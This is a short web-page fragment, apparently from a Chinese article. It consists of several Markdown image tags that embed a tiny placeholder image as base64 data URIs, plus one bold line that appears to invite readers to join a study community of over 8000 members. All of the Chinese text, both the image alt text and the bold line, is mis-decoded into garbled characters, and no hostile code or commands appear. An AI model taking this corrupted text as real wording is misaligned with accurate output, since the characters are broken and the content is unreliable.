![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)

**æ¥å’Œ8000+ä½åŒå­¦ä¸€èµ·åŠ å…¥æ˜Ÿçƒå­¦ä¹ å§ï¼**  

  

![å›¾ç‰‡](data:image/gif;base64,iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVQImWNgYGBgAAAABQABh6FO1AAAAABJRU5ErkJggg==)